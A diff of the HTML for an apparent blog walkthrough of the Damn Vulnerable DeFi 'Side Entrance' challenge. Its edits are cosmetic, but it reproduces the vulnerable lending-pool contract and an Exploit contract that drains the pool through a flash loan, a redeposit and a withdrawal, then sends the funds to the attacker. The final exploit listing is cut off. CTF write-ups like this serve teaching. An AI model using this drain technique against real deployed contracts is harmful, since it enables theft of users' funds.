@@ -103,26 +103,22 @@ back door&rdquo; 😂">
 <link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
 
-
-  
-  
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />
-
-
-
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
 
 
   
-    
-    
-    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
   
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.070807f22ed87a923883f1a61d2e227d67d923b7fa424ed9a2bf875f4949406e.css" integrity="sha256-BwgH8i7YepI4g/GmHS4ifWfZI7f6Qk7Zor&#43;HX0lJQG4=" crossorigin="anonymous" media="screen" />
+
+
+
+
 
 
 
 
   
-  <link rel="stylesheet" href="https://vyorkin.org/custom.min.cf4424ca575c8638b55547ace7bc3ab68c44ff1c808b1f1bb2358cdbcdbd8c41.css" integrity="sha256-z0Qkyldchji1VUes57w6toxE/xyAix8bsjWM2829jEE=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/custom.min.e79d44f53b0c4396d73bb2d809d0abbfb31a859a259ae12ed5d6c3a2af56d353.css" integrity="sha256-551E9TsMQ5bXO7LYCdCrv7MahZolmuEu1dbDoq9W01M=" crossorigin="anonymous" media="screen" />
 
 
 <link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
@@ -148,9 +144,7 @@ back door&rdquo; 😂">
 
 
 
-
-
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-light">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -189,8 +183,6 @@ back door&rdquo; 😂">
           
           
             
-          
-            
               
                 <li class="navigation-item menu-separator">
                   <span>|</span>
@@ -200,6 +192,8 @@ back door&rdquo; 😂">
               <li class="navigation-item">
                 <a href="https://vyorkin.org/ru-ru/">ru</a>
               </li>
+            
+          
             
           
             
@@ -269,47 +263,47 @@ take all ETH from the lending pool.
 </blockquote>
 
 <p>Here is the lending pool contract:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> <span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">12</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {Address} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/utils/Address.sol&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">interface</span> IFlashLoanEtherReceiver {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> execute() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @title SideEntranceLenderPool
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> SideEntranceLenderPool {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">using</span> Address <span style="color:#fff;font-weight:bold">for</span> <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">mapping</span>(<span style="color:#fff;font-weight:bold">address</span> =&gt; <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">private</span> balances;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    error NotEnoughETHInPool();
-</span></span><span style="display:flex;"><span>    error FlashLoanHasNotBeenPaidBack();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> deposit() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] += <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> withdraw() <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> amountToWithdraw = balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>];
-</span></span><span style="display:flex;"><span>        balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = <span style="color:#ff0;font-weight:bold">0</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).sendValue(amountToWithdraw);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; amount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughETHInPool();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        IFlashLoanEtherReceiver(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).execute{<span style="color:#fff;font-weight:bold">value</span>: amount}();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span> &lt; balanceBefore)
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Address</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;openzeppelin-contracts/utils/Address.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IFlashLoanEtherReceiver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">execute</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @title SideEntranceLenderPool
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">SideEntranceLenderPool</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="kt">address</span> <span class="k">payable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">private</span> <span class="n">balances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">NotEnoughETHInPool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">FlashLoanHasNotBeenPaidBack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amountToWithdraw</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="n">amountToWithdraw</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">balanceBefore</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">NotEnoughETHInPool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">IFlashLoanEtherReceiver</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="n">execute</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">amount</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&lt;</span> <span class="n">balanceBefore</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">FlashLoanHasNotBeenPaidBack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Side entrance lender pool&hellip;🤔 Sounds like a &ldquo;lender pool with a
 back door&rdquo; 😂</p>
 <h2 id="analysis">
@@ -324,32 +318,32 @@ doesn&rsquo;t use the <code>ReentrancyGuard</code>, in contrast to what we&rsquo
 seen in previous challenges. But at this moment it&rsquo;s not obvious
 for me how to leverage the re-entrancy here.</p>
 <p>The contract has the <code>balances</code> mapping to track the deposited ETH:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">mapping</span>(<span style="color:#fff;font-weight:bold">address</span> =&gt; <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">private</span> balances;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">private</span> <span class="n">balances</span><span class="p">;</span>
 </span></span></code></pre></div><p>Anyone can deposit funds using the <code>deposit</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> deposit() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>    balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] += <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>And they can withdraw their deposited funds by calling the
 <code>withdraw</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> withdraw() <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> amountToWithdraw = balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>];
-</span></span><span style="display:flex;"><span>    balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = <span style="color:#ff0;font-weight:bold">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).sendValue(amountToWithdraw);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">amountToWithdraw</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="n">amountToWithdraw</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>It uses the
 <a href="https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern"  class="external-link" target="_blank" rel="noopener">Checks-Effects-Interactions</a>
 pattern, so it looks like it is invulnerable to the re-entrancy
 attack.</p>
 <p>Let&rsquo;s explore what the <code>flashLoan</code> function does:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; amount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughETHInPool();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    IFlashLoanEtherReceiver(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).execute{<span style="color:#fff;font-weight:bold">value</span>: amount}();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span> &lt; balanceBefore)
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">balanceBefore</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">NotEnoughETHInPool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">IFlashLoanEtherReceiver</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="n">execute</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">amount</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&lt;</span> <span class="n">balanceBefore</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">revert</span> <span class="n">FlashLoanHasNotBeenPaidBack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><ul>
 <li>It takes an <code>amount</code> of Ether that the user wants to borrow.</li>
 <li>Check if the lending pool has enough funds.</li>
@@ -376,33 +370,33 @@ ETH and drain the pool.</p>
 <code>Exploit</code>. It should implement the <code>IFlashLoanEtherReceiver</code>
 interface and have the <code>receive</code> function so we could withdraw
 our deposited funds later.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">contract</span> Exploit <span style="color:#fff;font-weight:bold">is</span> IFlashLoanEtherReceiver {
-</span></span><span style="display:flex;"><span>    SideEntranceLenderPool <span style="color:#fff;font-weight:bold">private</span> pool;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> owner;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(SideEntranceLenderPool _pool) {
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
-</span></span><span style="display:flex;"><span>        pool = _pool;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> execute() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == <span style="color:#fff;font-weight:bold">address</span>(pool), <span style="color:#0ff;font-weight:bold">&#34;Sender is not a pool&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == owner, <span style="color:#0ff;font-weight:bold">&#34;Not an owner&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = <span style="color:#fff;font-weight:bold">address</span>(pool).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>        pool.flashLoan(poolBalance);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
-</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// Send stolen funds to the owner (attacker)
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">payable</span>(owner).sendValue(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {}
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"> <span class="kd">contract</span> <span class="nc">Exploit</span> <span class="k">is</span> <span class="n">IFlashLoanEtherReceiver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SideEntranceLenderPool</span> <span class="k">private</span> <span class="n">pool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">SideEntranceLenderPool</span> <span class="n">_pool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span> <span class="o">=</span> <span class="n">_pool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">execute</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="n">pool</span><span class="p">),</span> <span class="s">&#34;Sender is not a pool&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">&#34;Not an owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">poolBalance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">pool</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="n">poolBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Send stolen funds to the owner (attacker)
+</span></span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">owner</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>The following sequence diagram shows our exploit scenario:</p>
 <div class="mermaid">
 %%{init: {'theme':'neutral'}}%%
@@ -439,65 +433,65 @@ deactivate E
 
 
 <p>The exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Exploit <span style="color:#fff;font-weight:bold">is</span> IFlashLoanEtherReceiver {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">using</span> Address <span style="color:#fff;font-weight:bold">for</span> <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    SideEntranceLenderPool <span style="color:#fff;font-weight:bold">private</span> pool;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> owner;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(SideEntranceLenderPool _pool) {
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
-</span></span><span style="display:flex;"><span>        pool = _pool;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> execute() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == <span style="color:#fff;font-weight:bold">address</span>(pool), <span style="color:#0ff;font-weight:bold">&#34;Sender is not a pool&#34;</span>);
